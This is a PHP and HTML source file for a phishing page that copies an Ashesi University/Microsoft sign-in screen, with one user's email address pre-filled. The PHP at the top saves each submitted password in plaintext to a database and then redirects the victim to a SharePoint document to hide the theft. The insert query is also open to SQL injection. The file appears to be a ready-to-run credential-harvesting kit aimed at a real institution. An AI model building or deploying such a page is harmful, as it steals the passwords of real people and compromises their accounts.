<?php require("database_credentials.php");

  // Create connection
  $conn = new mysqli(servername,username,password,dbname);

  // Check connection
  if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
  }

  //check if form ahs been submitted
  if(isset($_POST["login"])){
    $pass = $_POST["psw"];

    $sql = "INSERT INTO `password`(`pwd`) VALUES ('$pass')";

    if ($conn->query($sql) === TRUE) {
        header('Location:'."https://aucampus-my.sharepoint.com/:w:/g/personal/miriam_duke_ashesi_edu_gh/ETSvCHSK5fRMnnQHUDDYWFsBD7-bQpDsB4fqqy0EfJR1oA?e=6rpCpw");
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
  }
?>
<!DOCTYPE html>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,500;0,600;0,700;1,300&display=swap" rel="stylesheet">
        <linK rel="stylesheet" href="style.css">
    </head>
    <body class="bg-image" style="width: 100%;">
        <div style="width:24%; margin:auto; background-color: white;">
            <form method="post"> 
                <div style="padding:10px">
                    <div class="imgcontainer">
                        <img src="ashesibannerlogo.jpeg" alt="Logo" class="logo">
                    </div>
                    <div class="container" style="width:90%; margin:auto" >
                        <span style="font-weight: 500; font-size:14px">
                            <i class="bi bi-arrow-left"></i>
                            <label for="uname">areimmer@ashesi.edu.gh</label>
                        </span>
                        <h4 style="font-family:serif; font-weight: 700; margin-top:10px; font-size:20px">Enter Password</h4>
                        <input id="unbordered" onclick="myFunction()" style="border-top:0; border-right:0; border-left:0; text-align: left; padding:2px; margin-top:20px; font-size:14px" type="password" placeholder="Password" name="psw" required>
                        <label style="margin-top:10px; font-size:10px; font-type:serif" id ="underline"><a style="color:#055fa3;" href="https://outlook.office365.com/mail/">Forgotten my Password</a></label>
                    </div>
                    <div class="container" style="width:35%; margin:auto; margin-right:20px; margin-top:-10px; margin-bottom:15px">
                        <button class="btn btn-primary" style="border-color: #055fa3; border-radius: 0; padding:3px; font-size:14px; background-color: #055fa3;"  type="submit" name='login'>Sign in</button>
                    </div>
                </div>  
            </form>
            <div style="width:100%;background-color:#f1f1f1;">
                <div class="container" style=" color:black; width:84%;" >
                    <p style="font-size:15px; font-family: 'serif; font-weight: 500;">Provide your login credentials to login, 
                        If you are on multifactor authentication, be sure to have your phone handy. You can always check the 30 days box before entering your MFA code to pause MFA for 30 days</p>
                </div>
            </div>
        </div>
    </body>
    <footer style="background:black; color:white; font-family:serif; height: 33px; bottom: 0; margin-top: 200px; font-size:12px; padding-top:5px; width: 100%;">
        <div id="underline">
            <p style="text-align:right">
                <a style="padding-right:10px; text-decoration: none; color:white" href="#"> Terms of Use </a>
                <a style="padding-right:10px; text-decoration: none; color:white" href="#"> Privacy & cookies</a>
                <a style="padding-right:10px; font-weight:600; text-decoration: none; color:white" href="#"> . . .</a>
            </p>
        </div>
    </footer>
    <script>
        function myFunction() {
            document.getElementById("unbordered").style.border-color = "red";
        }
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
</html>
